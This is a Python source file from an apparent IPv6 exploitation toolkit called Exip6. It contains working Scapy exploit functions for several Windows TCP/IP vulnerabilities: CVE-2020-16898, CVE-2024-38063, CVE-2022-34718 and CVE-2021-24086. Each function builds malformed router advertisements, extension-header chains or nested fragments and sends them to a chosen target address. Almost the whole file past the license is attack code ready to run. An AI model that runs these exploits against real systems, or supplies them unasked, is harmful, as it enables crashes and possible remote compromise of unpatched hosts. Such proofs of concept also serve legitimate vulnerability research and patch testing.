"""
    Exip6 - A modern IPv6 discovery, and exploitation toolkit that supports various IPv6 CVE exploits from the past decade with Python3 & Scapy.
    Created by Adrian Tarver(Th3Tr1ckst3r) @ https://github.com/Th3Tr1ckst3r/

////////////////////////////////////////////////////////////////////////////////////////

  IMPORTANT: READ BEFORE DOWNLOADING, COPYING, INSTALLING OR USING.

  By downloading, copying, installing, or using the software you agree to this license.
  If you do not agree to this license, do not download, install,
  copy, or use the software.


                    GNU AFFERO GENERAL PUBLIC LICENSE
                       Version 3, 19 November 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU Affero General Public License is a free, copyleft license for
software and other kinds of works, specifically designed to ensure
cooperation with the community in the case of network server software.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
our General Public Licenses are intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  Developers that use our General Public Licenses protect your rights
with two steps: (1) assert copyright on the software, and (2) offer
you this License which gives you legal permission to copy, distribute
and/or modify the software.

  A secondary benefit of defending all users' freedom is that
improvements made in alternate versions of the program, if they
receive widespread use, become available for other developers to
incorporate.  Many developers of free software are heartened and
encouraged by the resulting cooperation.  However, in the case of
software used on network servers, this result may fail to come about.
The GNU General Public License permits making a modified version and
letting the public access it on a server without ever releasing its
source code to the public.

  The GNU Affero General Public License is designed specifically to
ensure that, in such cases, the modified source code becomes available
to the community.  It requires the operator of a network server to
provide the source code of the modified version running there to the
users of that server.  Therefore, public use of a modified version, on
a publicly accessible server, gives the public access to the source
code of the modified version.

  An older license, called the Affero General Public License and
published by Affero, was designed to accomplish similar goals.  This is
a different license, not a version of the Affero GPL, but Affero has
released a new version of the Affero GPL which permits relicensing under
this license.

  The precise terms and conditions for copying, distribution and
modification follow here:

https://raw.githubusercontent.com/Th3Tr1ckst3r/Exip6/main/LICENSE

"""
import sys
import random
import threading
from scapy.all import *
from scapy.layers.inet6 import ICMPv6NDOptEFA, ICMPv6NDOptRDNSS, ICMPv6ND_RA, IPv6, IPv6ExtHdrFragment, fragment6
from scapy.layers.l2 import Ether


def cve_2020_16898(ipv6_addr=None, mac_addr=None, verbose=False, stop_event=None):
    """
    Generates our CVE-2020-16898 payload.
    """
    p_test_half = 'A'.encode() * 8 + b"\x18\x30" + b"\xFF\x18"
    p_test = p_test_half + 'A'.encode() * 4
    c = ICMPv6NDOptEFA()
    e = ICMPv6NDOptRDNSS()
    e.len = 21
    e.dns = [
        "AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
        "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"
    ]
    aaa = ICMPv6NDOptRDNSS()
    aaa.len = 8
    pkt = ICMPv6ND_RA() / aaa / \
        Raw(load='A'.encode() * 16 * 2 + p_test_half + b"\x18\xa0" * 6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

    p_test_frag = IPv6(dst=ipv6_addr, hlim=255) / \
        IPv6ExtHdrFragment() / pkt

    l = fragment6(p_test_frag, 200)
    
    # Use broadcast MAC address if none is provided
    if mac_addr is None:
        mac_addr = "ff:ff:ff:ff:ff:ff"

    if verbose:
        print(f"Using MAC address: {mac_addr}")

    for p in l:
        if stop_event and stop_event.is_set():
            break
        
        # Construct Ethernet frame
        eth_pkt = Ether(dst=mac_addr) / p
        
        send(eth_pkt, verbose=verbose)

    return True


def cve_2024_38063(ipv6_addr=None, mac_addr=None, verbose=False):
    """
    Generates our CVE-2024-38063 payload.
    """
    if mac_addr:
        ExtHdrDestOpt  = Ether(dst=mac_addr) / IPv6(fl=1, dst=ipv6_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0xC2)])
        ExtHdrFragment = Ether(dst=mac_addr) / IPv6(fl=1, dst=ipv6_addr) / IPv6ExtHdrFragment()
        return [ExtHdrDestOpt, ExtHdrFragment]
    else:
        ExtHdrDestOpt = IPv6(fl=1, dst=ipv6_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0xC2)])
        ExtHdrFragment = IPv6(fl=1, dst=ipv6_addr) / IPv6ExtHdrFragment()
        return [ExtHdrDestOpt, ExtHdrFragment]


def cve_2022_34718(ipv6_addr=None, mac_addr=None, verbose=False, stop_event=None):
    """
    Generates our CVE-2022-34718 payload. Original PoC author: SecLabResearchBV.
    """
    FRAGMENT_SIZE = 0x400
    LAYER4_FRAG_OFFSET = 0x8
    NEXT_HEADER_IPV6_ROUTE = 43
    NEXT_HEADER_IPV6_FRAG = 44
    NEXT_HEADER_IPV6_ICMP = 58

    def get_layer4():
        er = ICMPv6EchoRequest(data="AAAAAAAA")
        er.cksum = 0xa472
        return raw(er)

    def get_inner_packet(ipv6_addr):
        inner_frag_id = random.randint(0, 0xffffffff)
        if verbose:
            print("**** inner_frag_id: 0x{:x}".format(inner_frag_id))
        raw_er = get_layer4()
        # 0x1ffa Routing headers == 0xffd0 bytes
        routes = raw(IPv6ExtHdrRouting(addresses=[], nh=NEXT_HEADER_IPV6_ROUTE)) * (0xffd0 // 8 - 1)
        routes += raw(IPv6ExtHdrRouting(addresses=[], nh=NEXT_HEADER_IPV6_FRAG))
        # First inner fragment header: offset=0, more=1
        FH = IPv6ExtHdrFragment(offset=0, m=1, id=inner_frag_id, nh=NEXT_HEADER_IPV6_ICMP)
        return routes + raw(FH) + raw_er[:LAYER4_FRAG_OFFSET], inner_frag_id

    def send_last_inner_fragment(ipv6_addr, inner_frag_id):
        raw_er = get_layer4()
        ip = IPv6(dst=ipv6_addr)
        # Second (and last) inner fragment header: offset=1, more=0
        FH = IPv6ExtHdrFragment(offset=LAYER4_FRAG_OFFSET // 8, m=0, id=inner_frag_id, nh=NEXT_HEADER_IPV6_ICMP)
        packet = ip / FH / raw_er[LAYER4_FRAG_OFFSET:]
        if mac_addr:
            ether = Ether(dst=mac_addr)
            packet = ether / packet
        
        if verbose:
            print(f"Sending last inner fragment to {ipv6_addr} with MAC address: {mac_addr if mac_addr else 'None'}")
        
        try:
            send(packet, verbose=verbose)
        except Exception as e:
            print(f"Error sending packet: {e}")
        
        return True

    def trigger(ipv6_addr):
        inner_packet, inner_frag_id = get_inner_packet(ipv6_addr)
        ip = IPv6(dst=ipv6_addr)
        hopbyhop = IPv6ExtHdrHopByHop(nh=NEXT_HEADER_IPV6_FRAG)
        outer_frag_id = random.randint(0, 0xffffffff)
        fragmentable_part = [inner_packet[i * FRAGMENT_SIZE:(i + 1) * FRAGMENT_SIZE] for i in range(len(inner_packet) // FRAGMENT_SIZE)]
        if len(inner_packet) % FRAGMENT_SIZE:
            fragmentable_part.append(inner_packet[len(fragmentable_part) * FRAGMENT_SIZE:])
        
        if verbose:
            print("Preparing frags...")
        
        frag_offset = 0
        frags_to_send = []
        for i in range(len(fragmentable_part)):
            if stop_event and stop_event.is_set():
                print("Stopping during fragment preparation.")
                return False
            
            more = 0 if i == len(fragmentable_part) - 1 else 1
            FH = IPv6ExtHdrFragment(offset=frag_offset // 8, m=more, id=outer_frag_id, nh=NEXT_HEADER_IPV6_ROUTE)
            blob = raw(FH / fragmentable_part[i])
            frag_offset += FRAGMENT_SIZE
            frag = ip / hopbyhop / blob
            if mac_addr:
                ether = Ether(dst=mac_addr)
                frag = ether / frag
            frags_to_send.append(frag)
        
        if verbose:
            print("Sending {} frags...".format(len(frags_to_send)))
        
        for frag in frags_to_send:
            if stop_event and stop_event.is_set():
                if verbose:
                    print("Stopping during fragment sending.")
                return False
            if verbose:
                print(f"Sending fragment to {ipv6_addr} with MAC address: {mac_addr if mac_addr else 'None'}")
            send(frag, verbose=verbose)
        
        if stop_event and stop_event.is_set():
            if verbose:
                print("Stopping before sending the last inner fragment.")
            return False
        
        if verbose:
            print("Now sending the last inner fragment to trigger the bug...")
        return send_last_inner_fragment(ipv6_addr, inner_frag_id)

    # Start the exploit process
    return trigger(ipv6_addr)


def cve_2021_24086(ipv6_addr=None, mac_addr=None, verbose=False, iface=None, stop_event=None):
    """
    Generates our CVE-2021-24086 payload. Original PoC Author: Axel '0vercl0k' Souchet. I
    chose to not shorten this PoC due to network constraints of both Linux, & Scapy with Python3.
    """
    def frag6(ipv6_addr, mac_addr, frag_id, bytes_data, nh, frag_size=1008):
        assert (frag_size % 8) == 0
        leftover = bytes_data
        offset = 0
        frags = []
        while len(leftover) > 0:
            chunk = leftover[:frag_size]
            leftover = leftover[len(chunk):]
            last_pkt = len(leftover) == 0
            m = 0 if last_pkt else 1
            assert offset < 8191
            pkt = Ether(dst=mac_addr) / IPv6(dst=ipv6_addr) / IPv6ExtHdrFragment(m=m, nh=nh, id=frag_id, offset=offset) / Raw(chunk)
            offset += (len(chunk) // 8)
            frags.append(pkt)
        return frags
    frag_id = random.randint(0, 0xffffffff)
    second_pkt_id = (~frag_id & 0xffffffff)
    reassembled_pkt = IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xff)),
            PadN(optdata=('c'*0xff)),
            PadN(optdata=('d'*0xff)),
            PadN(optdata=('e'*0xff)),
            PadN(optdata=('f'*0xff)),
            PadN(optdata=('0'*0xff)),
        ]) \
        / IPv6ExtHdrDestOpt(options = [
            PadN(optdata=('a'*0xff)),
            PadN(optdata=('b'*0xa0)),
        ]) \
        / IPv6ExtHdrFragment(
            id = second_pkt_id, m = 1,
            nh = 17, offset = 0
        ) \
        / UDP(dport = 31337, sport = 31337, chksum=0x7e7f)

    reassembled_pkt = bytes(reassembled_pkt)
    assert (len(reassembled_pkt) % 8) == 0, 'not aligned'
    if verbose:
        print(f"\nSending payload to IPv6: {ipv6_addr} with MAC: {mac_addr}")
    frags = frag6(ipv6_addr, mac_addr, frag_id, reassembled_pkt, 60)
    if verbose:
        print(f'{len(frags)} fragments, total size {hex(len(reassembled_pkt))}')
    
    sendp(frags, iface=iface, verbose=verbose)

    reassembled_pkt_2 = Ether() \
        / IPv6(dst=ipv6_addr) \
        / IPv6ExtHdrFragment(id = second_pkt_id, m = 0, offset = 1, nh = 17) \
        / 'doar-e ftw'

    if stop_event and stop_event.is_set():
        print("\nProcess interrupted during exploit.")
        return

    sendp(reassembled_pkt_2, iface=iface, verbose=verbose)
    return True
